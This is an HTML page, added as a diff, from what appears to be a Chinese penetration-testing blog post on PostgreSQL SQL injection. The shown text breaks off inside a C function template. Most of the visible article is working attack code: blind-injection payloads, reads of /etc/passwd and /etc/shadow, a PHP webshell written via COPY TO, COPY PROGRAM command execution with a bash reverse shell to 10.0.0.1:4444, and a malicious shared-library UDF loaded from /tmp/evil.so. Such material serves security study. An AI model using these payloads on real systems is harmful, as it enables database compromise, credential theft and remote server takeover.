@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="引言PostgreSQL 功能丰富、扩展性强，但高级特性同样扩大了注入攻击面。与 MySQL 不同，PostgreSQL 的利用链路从延时注入到文件系统操作再到命令执行，攻击向量更加多样。本文聚焦 PostgreSQL 特有的注入技术与实战利用手法。 与 MySQL 关键差异   特性 MySQL PostgreSQL    堆叠查询 部分支持 原生支持   文件读取 LOAD_FILE() pg">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL注入：PostgreSQL注入实战">
+<meta property="og:url" content="https://congliang.github.io/SQL-injection-postgresql/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="引言PostgreSQL 功能丰富、扩展性强，但高级特性同样扩大了注入攻击面。与 MySQL 不同，PostgreSQL 的利用链路从延时注入到文件系统操作再到命令执行，攻击向量更加多样。本文聚焦 PostgreSQL 特有的注入技术与实战利用手法。 与 MySQL 关键差异   特性 MySQL PostgreSQL    堆叠查询 部分支持 原生支持   文件读取 LOAD_FILE() pg">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2024-12-01T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.962Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="数据库安全">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/SQL-injection-postgresql/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/SQL-injection-postgresql/","path":"SQL-injection-postgresql/","title":"SQL注入：PostgreSQL注入实战"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>SQL注入：PostgreSQL注入实战 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%95%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">引言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%8E-MySQL-%E5%85%B3%E9%94%AE%E5%B7%AE%E5%BC%82"><span class="nav-number">2.</span> <span class="nav-text">与 MySQL 关键差异</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8%EF%BC%9Apg-sleep-%E7%B3%BB%E5%88%97"><span class="nav-number">3.</span> <span class="nav-text">一、时间盲注：pg_sleep 系列</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%87%8D%E8%A6%81%E9%99%B7%E9%98%B1"><span class="nav-number">3.1.</span> <span class="nav-text">重要陷阱</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%EF%BC%9Apg-read-file-%E4%B8%8E-pg-ls-dir"><span class="nav-number">4.</span> <span class="nav-text">二、文件操作：pg_read_file 与 pg_ls_dir</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81COPY-%E5%91%BD%E4%BB%A4%E5%88%A9%E7%94%A8"><span class="nav-number">5.</span> <span class="nav-text">三、COPY 命令利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E5%86%99%E5%85%A5"><span class="nav-number">5.1.</span> <span class="nav-text">文件读取与写入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#COPY-PROGRAM-%E2%80%94%E2%80%94-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%889-3-%EF%BC%89"><span class="nav-number">5.2.</span> <span class="nav-text">COPY PROGRAM —— 命令执行（9.3+）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81%E5%A4%A7%E5%AF%B9%E8%B1%A1%EF%BC%88Large-Object%EF%BC%89%E6%94%BB%E5%87%BB"><span class="nav-number">6.</span> <span class="nav-text">四、大对象（Large Object）攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81UDF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">7.</span> <span class="nav-text">五、UDF 命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#C-%E8%AF%AD%E8%A8%80-UDF-%E6%A8%A1%E6%9D%BF%EF%BC%88%E6%A0%B8%E5%BF%83%E9%AA%A8%E6%9E%B6%EF%BC%89"><span class="nav-number">7.1.</span> <span class="nav-text">C 语言 UDF 模板（核心骨架）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81PL-pgSQL-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-number">8.</span> <span class="nav-text">六、PL&#x2F;pgSQL 代码执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E6%94%BB%E5%87%BB%E5%86%B3%E7%AD%96%E6%B5%81%E7%A8%8B%E5%9B%BE"><span class="nav-number">9.</span> <span class="nav-text">七、攻击决策流程图</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81WAF-%E7%BB%95%E8%BF%87%E4%B8%8E%E5%AE%9E%E6%88%98%E9%99%B7%E9%98%B1"><span class="nav-number">10.</span> <span class="nav-text">八、WAF 绕过与实战陷阱</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="nav-number">10.1.</span> <span class="nav-text">绕过技巧</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E9%99%B7%E9%98%B1"><span class="nav-number">10.2.</span> <span class="nav-text">常见陷阱</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD"><span class="nav-number">11.</span> <span class="nav-text">九、防御措施</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%BC%80%E5%8F%91%E5%B1%82%E9%9D%A2"><span class="nav-number">11.1.</span> <span class="nav-text">开发层面</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%A0%E5%9B%BA"><span class="nav-number">11.2.</span> <span class="nav-text">数据库加固</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9B%91%E6%8E%A7%E5%91%8A%E8%AD%A6"><span class="nav-number">11.3.</span> <span class="nav-text">监控告警</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E7%BB%93"><span class="nav-number">12.</span> <span class="nav-text">总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/SQL-injection-postgresql/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="SQL注入：PostgreSQL注入实战 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SQL注入：PostgreSQL注入实战
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2024-12-01 08:00:00" itemprop="dateCreated datePublished" datetime="2024-12-01T08:00:00+08:00">2024-12-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>PostgreSQL 功能丰富、扩展性强，但高级特性同样扩大了注入攻击面。与 MySQL 不同，PostgreSQL 的利用链路从延时注入到文件系统操作再到命令执行，攻击向量更加多样。本文聚焦 PostgreSQL 特有的注入技术与实战利用手法。</p>
+<h2 id="与-MySQL-关键差异"><a href="#与-MySQL-关键差异" class="headerlink" title="与 MySQL 关键差异"></a>与 MySQL 关键差异</h2><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>MySQL</th>
+<th>PostgreSQL</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>堆叠查询</td>
+<td>部分支持</td>
+<td>原生支持</td>
+</tr>
+<tr>
+<td>文件读取</td>
+<td>LOAD_FILE()</td>
+<td>pg_read_file()</td>
+</tr>
+<tr>
+<td>延时函数</td>
+<td>SLEEP()</td>
+<td>pg_sleep()</td>
+</tr>
+<tr>
+<td>命令执行</td>
+<td>UDF (.so&#x2F;.dll)</td>
+<td>UDF + COPY PROGRAM + PL&#x2F;pgSQL</td>
+</tr>
+<tr>
+<td>大对象</td>
+<td>无</td>
+<td>lo_import &#x2F; lo_export</td>
+</tr>
+</tbody></table>
+<h2 id="一、时间盲注：pg-sleep-系列"><a href="#一、时间盲注：pg-sleep-系列" class="headerlink" title="一、时间盲注：pg_sleep 系列"></a>一、时间盲注：pg_sleep 系列</h2><p>PostgreSQL 使用 <code>pg_sleep(seconds)</code> 实现延时，另有 <code>pg_sleep_for()</code> 和 <code>pg_sleep_until()</code> 用于更精细控制。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 条件延时：判断当前数据库名首字是否为 &#x27;t&#x27;</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> (<span class="keyword">SELECT</span> current_database()) <span class="keyword">LIKE</span> <span class="string">&#x27;t%&#x27;</span></span><br><span class="line">    <span class="keyword">THEN</span> pg_sleep(<span class="number">3</span>) <span class="keyword">ELSE</span> pg_sleep(<span class="number">0</span>) <span class="keyword">END</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 二分法盲注：判断字符 ASCII 是否大于 109（字母 &#x27;m&#x27;）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> ASCII(<span class="built_in">SUBSTRING</span>(current_database(), <span class="number">1</span>, <span class="number">1</span>)) <span class="operator">&gt;</span> <span class="number">109</span></span><br><span class="line">    <span class="keyword">THEN</span> pg_sleep(<span class="number">2</span>) <span class="keyword">ELSE</span> pg_sleep(<span class="number">0</span>) <span class="keyword">END</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="重要陷阱"><a href="#重要陷阱" class="headerlink" title="重要陷阱"></a>重要陷阱</h3><p><code>pg_sleep()</code> 对每行都执行一次。若查询返回多行，总延时 &#x3D; 行数 × sleep 秒数，极易导致误判。务必使用 <code>generate_series(1,1)</code> 或 <code>LIMIT 1</code> 限制：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (...) THEN pg_sleep(3)</span></span><br><span class="line"><span class="string">    ELSE NULL END FROM generate_series(1,1))--</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="二、文件操作：pg-read-file-与-pg-ls-dir"><a href="#二、文件操作：pg-read-file-与-pg-ls-dir" class="headerlink" title="二、文件操作：pg_read_file 与 pg_ls_dir"></a>二、文件操作：pg_read_file 与 pg_ls_dir</h2><p>超级用户或拥有对应函数 EXECUTE 权限的角色可直接操作文件系统。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 读取 /etc/passwd（指定偏移与长度）</span></span><br><span class="line"><span class="keyword">SELECT</span> pg_read_file(<span class="string">&#x27;/etc/passwd&#x27;</span>, <span class="number">0</span>, <span class="number">2000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 读取 postgresql.conf 配置文件</span></span><br><span class="line"><span class="keyword">SELECT</span> pg_read_file(</span><br><span class="line">    (<span class="keyword">SELECT</span> setting <span class="keyword">FROM</span> pg_settings <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;data_directory&#x27;</span>)</span><br><span class="line">    <span class="operator">||</span> <span class="string">&#x27;/postgresql.conf&#x27;</span>, <span class="number">0</span>, <span class="number">5000</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 报错注入读取（无直接回显时）</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CAST</span>(pg_read_file(<span class="string">&#x27;/etc/passwd&#x27;</span>) <span class="keyword">AS</span> <span class="type">integer</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 列出数据目录</span></span><br><span class="line"><span class="keyword">SELECT</span> pg_ls_dir((<span class="keyword">SELECT</span> setting <span class="keyword">FROM</span> pg_settings <span class="keyword">WHERE</span> name<span class="operator">=</span><span class="string">&#x27;data_directory&#x27;</span>));</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、COPY-命令利用"><a href="#三、COPY-命令利用" class="headerlink" title="三、COPY 命令利用"></a>三、COPY 命令利用</h2><p><code>COPY</code> 是 PostgreSQL 最强大的数据导入导出机制，支持文件读、写、命令执行。</p>
+<h3 id="文件读取与写入"><a href="#文件读取与写入" class="headerlink" title="文件读取与写入"></a>文件读取与写入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- COPY FROM 读文件</span></span><br><span class="line"><span class="keyword">CREATE</span> TEMP <span class="keyword">TABLE</span> file_content (line text);</span><br><span class="line"><span class="keyword">COPY</span> file_content <span class="keyword">FROM</span> <span class="string">&#x27;/etc/passwd&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> file_content;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- COPY TO 写 Webshell</span></span><br><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>)</span><br><span class="line">    <span class="keyword">TO</span> <span class="string">&#x27;/var/www/html/upload/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h3 id="COPY-PROGRAM-——-命令执行（9-3-）"><a href="#COPY-PROGRAM-——-命令执行（9-3-）" class="headerlink" title="COPY PROGRAM —— 命令执行（9.3+）"></a>COPY PROGRAM —— 命令执行（9.3+）</h3><p>最直接的命令执行方式，需超级用户且 <code>pg_execute_server_program</code> 未禁用：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 执行命令并获取回显</span></span><br><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span>) <span class="keyword">TO</span> PROGRAM <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 将命令结果读入表中</span></span><br><span class="line"><span class="keyword">CREATE</span> TEMP <span class="keyword">TABLE</span> cmd_output (output text);</span><br><span class="line"><span class="keyword">COPY</span> cmd_output <span class="keyword">FROM</span> PROGRAM <span class="string">&#x27;whoami&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> cmd_output;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- 反弹 Shell</span></span><br><span class="line"><span class="keyword">COPY</span> (<span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span>) <span class="keyword">TO</span> PROGRAM</span><br><span class="line">    <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.0.1/4444 0&gt;&amp;1&quot;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、大对象（Large-Object）攻击"><a href="#四、大对象（Large-Object）攻击" class="headerlink" title="四、大对象（Large Object）攻击"></a>四、大对象（Large Object）攻击</h2><p>大对象支持单一事务操作最大 4TB 数据，<code>lo_import()</code> 和 <code>lo_export()</code> 实现文件系统与数据库的双向传输。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- lo_import 将文件导入数据库，返回 OID</span></span><br><span class="line"><span class="keyword">SELECT</span> lo_import(<span class="string">&#x27;/etc/passwd&#x27;</span>);   <span class="comment">-- 返回如 123456</span></span><br><span class="line"><span class="string">&#x27; UNION SELECT NULL, lo_import(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;), NULL--  -- 联合注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- lo_export 将大对象导出写文件</span></span><br><span class="line"><span class="string">SELECT lo_from_bytea(0, decode(&#x27;</span>cGxhaW50ZXh0<span class="string">&#x27;, &#x27;</span>base64<span class="string">&#x27;));</span></span><br><span class="line"><span class="string">SELECT lo_export(12345, &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>shell.php<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 文件拷贝：读入后写出到可访问目录</span></span><br><span class="line"><span class="string">SELECT lo_export(lo_import(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;), &#x27;</span><span class="operator">/</span>tmp<span class="operator">/</span>passwd_copy.txt<span class="string">&#x27;);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 读取大对象内容（分片存储，按 pageno 排序拼接）</span></span><br><span class="line"><span class="string">SELECT encode(data, &#x27;</span><span class="keyword">escape</span><span class="string">&#x27;) FROM pg_largeobject</span></span><br><span class="line"><span class="string">    WHERE loid=12345 ORDER BY pageno;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="五、UDF-命令执行"><a href="#五、UDF-命令执行" class="headerlink" title="五、UDF 命令执行"></a>五、UDF 命令执行</h2><p>当 COPY PROGRAM 不可用时，编译共享库创建用户自定义函数是经典提权路径。</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- Step 1: 以十六进制将 .so 文件分片写入大对象</span></span><br><span class="line"><span class="keyword">SELECT</span> lo_create(<span class="number">99999</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">99999</span>, <span class="number">0</span>, decode(<span class="string">&#x27;7f454c46...&#x27;</span>, <span class="string">&#x27;hex&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Step 2: 导出到文件系统</span></span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">99999</span>, <span class="string">&#x27;/tmp/evil.so&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Step 3: 创建函数并执行命令</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> REPLACE <span class="keyword">FUNCTION</span> sys_eval(text) <span class="keyword">RETURNS</span> text</span><br><span class="line">    <span class="keyword">AS</span> <span class="string">&#x27;/tmp/evil.so&#x27;</span>, <span class="string">&#x27;sys_eval&#x27;</span> <span class="keyword">LANGUAGE</span> C STRICT;</span><br><span class="line"><span class="keyword">SELECT</span> sys_eval(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="keyword">SELECT</span> sys_eval(<span class="string">&#x27;cat /etc/shadow&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<h3 id="C-语言-UDF-模板（核心骨架）"><a href="#C-语言-UDF-模板（核心骨架）" class="headerlink" title="C 语言 UDF 模板（核心骨架）"></a>C 语言 UDF 模板（核心骨架）</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;postgres.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;fmgr.h&quot;</span></span></span><br><span class="line">PG_MODULE_MAGIC;</span><br><span class="line">PG_FUNCTION_INFO_V1(sys_eval);</span><br><span class="line">Datum <span class="title function_">sys_eval</span><span class="params">(PG_FUNCTION_ARGS)</span> &#123;</span><br><span class="line">    FILE *fp = popen(text_to_cstring(PG_GETARG_TEXT_P(<span class="number">0</span>)), <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="comment">// ... 读取输出，组装 text 返回</span></span><br><span class="line">    